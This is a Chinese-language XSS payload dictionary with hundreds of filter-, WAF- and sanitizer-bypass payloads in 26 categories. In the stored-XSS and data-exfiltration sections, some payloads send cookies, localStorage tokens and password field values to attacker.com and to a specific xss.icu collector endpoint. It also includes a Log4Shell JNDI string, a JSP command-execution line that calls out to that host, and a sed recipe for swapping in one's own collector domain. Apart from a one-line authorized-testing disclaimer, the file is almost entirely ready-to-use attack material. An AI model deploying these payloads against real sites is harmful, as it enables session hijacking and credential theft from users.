# XSS Payload 高级绕过字典

---

## 目录

1. [基础大小写混合与标签混淆](#1-基础大小写混合与标签混淆)
2. [浏览器突变型XSS](#2-浏览器突变型xss)
3. [编码绕过](#3-编码绕过)
4. [协议层混淆绕过](#4-协议层混淆绕过)
5. [空字节与控制字符注入](#5-空字节与控制字符注入)
6. [注释混淆与标签闭合](#6-注释混淆与标签闭合)
7. [嵌套标签与多重混淆](#7-嵌套标签与多重混淆)
8. [短事件处理器](#8-短事件处理器)
9. [JS模板字符串注入](#9-js模板字符串注入)
10. [DOMPurify绕过](#10-dompurify绕过)
11. [DOM破坏攻击](#11-dom破坏攻击)
12. [Polyglot payloads](#12-polyglot-payloads)
13. [Unicode归一化绕过](#13-unicode归一化绕过)
14. [AngularJS SSTI](#14-angularjs-ssti)
15. [React/Vue框架绕过](#15-reactvue框架绕过)
16. [CSS样式表突变](#16-css样式表突变)
17. [Emoji绕过](#17-emoji绕过)
18. [Data URI混淆](#18-data-uri混淆)
19. [WAF特征检测](#19-waf特征检测)
20. [极短Payload](#20-极短payload)
21. [存储型XSS](#21-存储型xss)
22. [反射型XSS](#22-反射型xss)
23. [XSS DoS](#23-xss-dos)
24. [特殊标签绕过](#24-特殊标签绕过)
25. [企业级WAF绕过](#25-企业级waf绕过)
26. [数据外带Payload](#26-数据外带payload)

---

## 1. 基础大小写混合与标签混淆

```
<ScRiPt>alert(document.domain)</ScRiPt>
<script>alert(1)</script>
<IMG SRC=jAVasCrIPt:alert(1)>
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<select onfocus=alert(1)><option>1</option></select>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<object data=x onerror=alert(1)>
<embed src=x onerror=alert(1)>
<form action=x onsubmit=alert(1)><input type=submit>
```

## 2. 浏览器突变型XSS

```
<noscript><p title='</noscript><img src=x onerror=alert(1)'>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)'>
<svg><style><foreignObject><img src=x onerror=alert(1)'>
<noscript><style></noscript><img src=x onerror=alert(1)'>
<style></style><img src=x onerror=alert(1)>
<table><style><img src=x onerror=alert(1)>
```

## 3. 编码绕过

```
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>
<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg onload=eval(atob('YWxlcnQoMSk='))>
javascript:eval(atob('YWxlcnQoMSk='))
<a href='javascript:eval(atob("YWxlcnQoMSk="))'>click</a>
<img src=x onerror=Function(atob('YWxlcnQoMSk='))()>
javascript:\\u0061\\u006C\\u0065\\u0072\\u0074(1)
```

## 4. 协议层混淆绕过

```
<a href='jAvAsCrIPt:alert(1)'>click</a>
<a href='javaSCRIPT:alert(1)'>click</a>
<a href=' javascript:alert(1)'>click</a>
<a href='java\nscript:alert(1)'>click</a>
<a href='java&#x0D;script:alert(1)'>click</a>
<a href='java&#x09;script:alert(1)'>click</a>
<a href='&#106;avascript:alert(1)'>click</a>
<a href='&#x6A;avascript:alert(1)'>click</a>
<form action='javascript:alert(1)'><input type=submit>
<isindex action='javascript:alert(1)' type=submit>
<object data='javascript:alert(1)'>
<embed src='javascript:alert(1)'>
```

## 5. 空字节与控制字符注入

```
<scr\u0000ipt>alert(1)</scr\u0000ipt>
<img src=x onerror='aler\u0000t(1)'>
<svg onload='ale\u0000rt(1)'>
<scr\u200Cipt>alert(1)</scr\u200Cipt>
<scr\u200Dipt>alert(1)</scr\u200Dipt>
<img src=x onerror=\\u0061lert(1)>
<script>al\\u0065rt(1)</script>
<%00img src=x onerror=alert(1)>
javascript:alert(1)//\\u000a
<img src=x onerror=alert%601%60>
```

## 6. 注释混淆与标签闭合

```
<!--><img src=x onerror=alert(1)>-->
--><img src=x onerror=alert(1)>
<img src=x onerror=alert(1)//>
<img src=x onerror=alert(1)><!---->
<svg><!--</svg><img src=x onerror=alert(1)>-->
><img src=x onerror=alert(1)>
<img src=x onerror='alert(1)' title='">
"><img src=x onerror=alert(1)>
'><img src=x onerror=alert(1)>
><img src=x onerror=alert(1)>
javascript:alert(1);//
javascript:alert(1);/*
```

## 7. 嵌套标签与多重混淆

```
<scr<script>ipt>alert(1)</scr</script>ipt>
<svg><script>alert(1)</script></svg>
<math><mtext></mtext><script>alert(1)</script></math>
<noscript><style></noscript><script>alert(1)</script>
<select><template><style></style><script>alert(1)</script></template></select>
<svg><foreignObject><body onload=alert(1)></body></foreignObject></svg>
<style><style/><script>alert(1)</script></style>
```

## 8. 短事件处理器

```
<svg/onload=alert(1)>
<img/src=x/onerror=alert(1)>
<video><source/onerror=alert(1)>
<audio><source/onerror=alert(1)>
<body/onload=alert(1)>
<input/onfocus=alert(1)/autofocus>
<svg><set/attributeName=onload/to=alert(1)>
<details/open/ontoggle=alert(1)>
<marquee/onstart=alert(1)>
<progress/bar/onmouseover=alert(1)>
<meter/onmouseover=alert(1)>0</meter>
<ruby/onmouseover=alert(1)><rt>click</rt></ruby>
```

## 9. JS模板字符串注入

```
<script>alert`1`</script>
<script>eval(`${prompt(1)}`)</script>
<img src=x onerror=`alert(1)`>
<svg onload=`alert(1)`>
<script>Function`a${alert(1)}lert```</script>
<script>[][('alert')(1)]</script>
<script>top['al'+'ert'](1)</script>
<script>this['alert'](1)</script>
<script>window['alert'](1)</script>
<script>frames['alert'](1)</script>
<img src=x onerror=top['alert'](1)>
<svg onload=self['alert'](1)>
<script>with(document)alert(domain)</script>
<script>atob('YWxlcnQoMSk=')</script>
```

## 10. DOMPurify绕过

```
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>
<svg><style><g onclick=alert(1)>click</g></style></svg>
<math><mtext><maction actiontype="statusline#http://google.com" >XSS</maction></mtext></math>
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>--></mglyph></table></mtext></math>
<form><math><mtext></math><form><button formaction=javascript:alert(1)>XSS</button></form></math></form>
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<svg><script>alert( String.fromCharCode(49) )</script></svg>
<svg><a href="javascript:alert(1)"><circle r=100></circle></a></svg>
<svg><animate href=#x onbegin=alert(1) attributeName=href values=javascript:alert(1)></animate><a id=x><circle r=10></circle></a></svg>
```

## 11. DOM破坏攻击

```
<form id=alert><input name=nodeType value=x>
<form id=x><input id=alert name=value>
<div id=alert>click
<a id=alert>click
<meta id=alert>
<base id=alert>
<object id=alert>
<img id=alert src=x>
<style id=alert></style>
<table id=alert><td id=alert>
<template><style id=alert></style></template>
<form><input id=elements><input name=alert>
```

## 12. Polyglot payloads

```
javascript:/*--></title></script></style></xmp><svg/onload=/*<svg/onload=alert(1)>*/=alert(1)//>
<!--><svg onload=/*--><img src=x onerror=alert(1)>-->
'>\\/*<svg onload=alert(1)>*/'/*
<script>//\"></script><script>alert(1)</script>
<script>/*'\"*/);alert(1)//</script>
"><script>/*-->alert(1)</script>
<img src=x /* onerror=alert(1)>//`
javascript:/*--></title></script></style></xmp><details/open/ontoggle=alert(1)/*>
<svg<!--onload=alert(1)//-->>
<![CDATA[><svg/onload=alert(1)]>
```

## 13. Unicode归���化��过

```
<script>alert(1)</script>
<script>al\u0065rt(1)</script>
<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>
<img src=x onerror=\\u0061lert(1)>
java\\u0073cript:alert(1)
<img src='x' onerror='\\u0061lert(1)'/>
<script>\\x61\\x6c\\x65\\x72\\x74(1)</script>
<img/\\x6fnload=alert(1)>
<img/\\x73rc=x/onerror=alert(1)>
j\\x61vascript:alert(1)
```

## 14. AngularJS SSTI

```
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{a='constructor';alert($root.$id)}}
{onclick=alert(1)}
<ng-app><ng-script>alert(1)</ng-script></ng-app>
<svg ng-app ng-controller=$on.constructor('alert(1)')()>
{{{}.'constructor'.constructor('alert(1)')()}}
{{'a'.constructor.prototype.charAt=[].join;alert(1)}}
<x ng-app>{{x='constructor';alert($eval('a'+'lert(1)'))}}
```

## 15. React/Vue框架绕过

```
{{constructor.constructor('alert(1)')()}}
<img src=x {{constructor.constructor('alert(1)')()}}>
<svg><animate onbegin=alert(1) attributeName=x values=1></animate></svg>
<svg><set attributeName=onmouseover to=alert(1)>
<svg><a href="javascript:alert(1)"><circle r=100></circle></a></svg>
<math><a href=javascript:alert(1)>xss</a></math>
<svg><use href=#x><set attributeName=href to=javascript:alert(1)></set></svg>
<details open ontoggle=alert(1)>
<svg><animate attributeName=href values=javascript:alert(1) />
<svg><animate href=javascript:alert(1) />
<svg><set attributeName=href to=javascript:alert(1) />
```

## 16. CSS样式表突变

```
<style><style/><script>alert(1)</script></style>
<style></style><img src=x onerror=alert(1)>
<!--<style-->}*{color:red}</style><img src=x onerror=alert(1)>//
<style>@import'javascript:alert(1)';</style>
<style>*{font-family:')}*{xss:expression(alert(1))}</style>
<body{background:url(javascript:alert(1))}</style>
<div{background:url('javascript:alert(1)')}</style>
<link rel=stylesheet href='javascript:alert(1)'>
<style>@import'xss.xml?import</style>
```

## 17. Emoji绕过

```
<img src=x onerror=🖕(1)>
<svg onload=🖕(1)>
<script>var 🖕 = 1; alert(🖕)</script>
<img src=x onerror='🖕'=1;alert(🖕)'>
🖕
👶
💦
🧨
<script>window['🖕'](1)</script>
<img src=x onerror=window['🖕'](1)>
javascript:🖕(1)
<a href=javascript:🖕(1)>click</a>
```

## 18. Data URI混淆

```
<a href='data:text/html,<script>alert(1)</script>'>click</a>
<a href='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='>click</a>
<object data='data:text/html,<script>alert(1)</script>'>
<iframe src='data:text/html,<script>alert(1)</script>'>
<embed src='data:text/html,<script>alert(1)</script>'>
<form action='data:text/html,<script>alert(1)</script>'><input type=submit>
javascript:eval("data:text/html,<script>alert(1)</script>")
<a href='data:,alert(1)'>click</a>
```

## 19. WAF特征检测

```
<img src=x onerror=alert%26%230000000001;1>
<svg/onload=al\\u0065rt(1)>
<script>al\\u0065rt(1)</script>
<img src=x onerror='\\u0061lert(1)'>
<svg><script>\\u0061lert(1)</script></svg>
<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<svg onload=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<<script>script>alert(1)//</script>
<script\\x00>alert(1)</script>
<img src=x alt='</script><script>alert(1)</script>'/>
<script>alert(1)<\\/script>
<scr\\x00ipt>alert(1)</scr\\x00ipt>
<style></style><script>alert(1)</script>
```

## 20. 极短Payload

```
<>"'onload=alert(1)>
"><svg onload=alert(1)>
'onclick=alert(1)>
"><img src=x onerror=alert(1)>
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<svg/onload=eval(atob('YWxlcnQoMSk='))>
<script>Function(atob('YWxlcnQoMSk='))()</script>
<iframe src=javascript:eval(atob('YWxlcnQoMSk='))>
<script>setTimeout(atob('YWxlcnQoMSk='),0)</script>
<script>setInterval(atob('YWxlcnQoMSk='),0)</script>
<script>requestAnimationFrame(()=>atob('YWxlcnQoMSk='))</script>
```

## 21. 存储型XSS

```
<img src=x onerror=alert(document.domain)>
<svg onload=alert(localStorage.getItem('secret'))>
<script>fetch('https://attacker.com?c='+document.cookie)</script>
<img src=x onerror=navigator.sendBeacon('https://attacker.com',document.cookie)>
<svg onload=fetch('https://attacker.com',{method:'POST',body:document.cookie})>
<script>location='https://attacker.com?data='+btoa(document.cookie)</script>
<img src=x onerror=eval(atob('bG9jYWxob3N0J3M='))>
<iframe src=javascript:alert(parent.document.cookie)>
<script>alert(top.document.domain)</script>
<svg onload=alert(document.referrer)>
```

## 22. 反射型XSS

```
<script>alert(1)</script>
"><script>alert(1)</script>
'-alert(1)-'
${alert(1)}
{{alert(1)}}
<%=alert(1)%>
<?alert(1)?>
<%alert(1)%>
${jndi:ldap://xss.icu/a}
${''.__class__.__mro__[1].__subclasses__()}>
<%=Runtime.getRuntime().exec('curl xss.icu')%>
```

## 23. XSS DoS

```
<script>while(true)alert(1)</script>
<img src=x onerror='while(true)alert(1)'>
<script>for(;;)alert(1)</script>
<svg onload='setInterval("alert(1)",0)'>
<img src=x onerror='setInterval(alert(1),0)'>
<script>confirm('x'.repeat(1e5))</script>
<img src=x onerror='confirm("x".repeat(1e5))'>
```

## 24. 特殊标签绕过

```
<svg><set attributeName=onmouseover to=alert(1)>
<svg><animate attributeName=href to=javascript:alert(1)>
<svg><animate href=javascript:alert(1) begin=0/>
<svg><use href=#x><set attributeName=href to=javascript:alert(1)></set></svg>
<svg><feBlend in=SourceGraphic mode='multiply'><set attributeName=href to=javascript:alert(1)></feBlend></svg>
<math><maction actiontype=show>XSS<img src=x onerror=alert(1)></maction></math>
<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#"><a xmlns:a="http://www.w3.org/1999/02/22-rdf-syntax-ns#" rdf:parsetype="Literal">xss</a></rdf:RDF>
<xml:id="x"></xml><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script>
<html><head><base href="javascript:alert(1)//"></head><body>XSS</body></html>
```

## 25. 企业级WAF绕过

```
<svg/onload=cons❌tructor❌tor('alert(1)')()>
<svg onload=window['ale'+'rt'](1)>
<IMG SRC=x onERROR=window['\x61\x6c\x65\x72\x74'](1)>
<script>/*-/*`/*\\`'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0d%0a//</script>
<ScRiPt>window['al\\u0065rt'](1)</ScRiPt>
<svg><set attributeName=href to=java\\u0073cript:alert(1) />
<img src=x:alert(1)>
<svg><a href="jav\tascript\\:alert(1)"><circle r=100></circle></a></svg>
<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>
```

## 26. 数据外带Payload

```
<script>fetch('https://xss.icu/api/x/efb30de519e1?c='+document.cookie)</script>
<svg onload=fetch('https://xss.icu/api/x/efb30de519e1',{method:'POST',headers:{'Content-Type':'text/plain'},body:document.cookie})>
<img src=x onerror=navigator.sendBeacon('https://xss.icu/api/x/efb30de519e1',document.cookie)>
<script>new Image().src='https://xss.icu/api/x/efb30de519e1?d='+btoa(localStorage.getItem('token'))</script>
<iframe src="data:text/html,<script>top.flag='ok';parent.location='https://xss.icu/api/x/efb30de519e1?f='+top.flag</script>">
<script>location='https://xss.icu/api/x/efb30de519e1?u='+encodeURIComponent(document.documentURI)</script>
<svg onload=fetch('https://xss.icu/api/x/efb30de519e1?r='+document.referrer)>
<script>eval(atob('aWYocHJvbXB0KDEpKXt3aW5kb3cubG9jYXRpb249J2h0dHBzOi8veHNzLmljdS9hcGkveC9lZmIzMGRlNTE5ZTE+L2NvbnNvbGUnfQ=='))</script>
<script>location='https://xss.icu/api/x/efb30de519e1?k='+btoa(Object.keys(localStorage).map(k=>k+':'+localStorage[k]).join('|'))</script>
<script>fetch('https://xss.icu/api/x/efb30de519e1',{method:'POST',mode:'no-cors',body:document.querySelectorAll('input[type=text],input[type=password]').map(i=>i.value).join(',')})</script>
```

---

## 快速替换目标地址

```bash
# 批量替换目标平台域名
sed 's/xss\.icu/你的平台域名/g' xss_payload_dic.md

# 仅提取payload列表
grep -oP '(?<=^`)\K[^`]+(?=`$)' xss_payload_dic.md > payloads.txt
```

---

## 分类速查表

| 分类  | 适用场景                 |
| ----- | ------------------------ |
| 1-5   | 基础WAF、缺省过滤器      |
| 6-8   | HTML净化、属性清理       |
| 9-13  | 实体编码过滤器           |
| 10,14 | DOMPurify、Angular JS    |
| 11    | 无脚本沙箱               |
| 15-17 | React/Vue、各类框架      |
| 19,25 | 企业级WAF (Cloudflare等) |
| 26    | 数据外带/平台集成        |

---

> **警告**: 本工具仅供授权安全测试使用
